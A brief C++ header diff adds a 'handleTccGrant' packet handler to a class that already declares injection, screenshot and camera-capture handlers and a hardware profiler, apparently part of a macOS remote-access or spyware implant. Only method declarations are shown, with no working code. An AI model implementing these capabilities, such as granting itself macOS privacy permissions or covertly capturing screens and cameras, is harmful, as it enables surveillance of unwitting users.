@@ -79,6 +79,7 @@ private:
     void handleInjection(Packet&& packet);
     void handleScreenshot();
     void handleCameraCapture();
+    void handleTccGrant(Packet&& packet);
 
     // System Profiler (Gourmandise Subsystem)
     std::string getHardwareUUID();
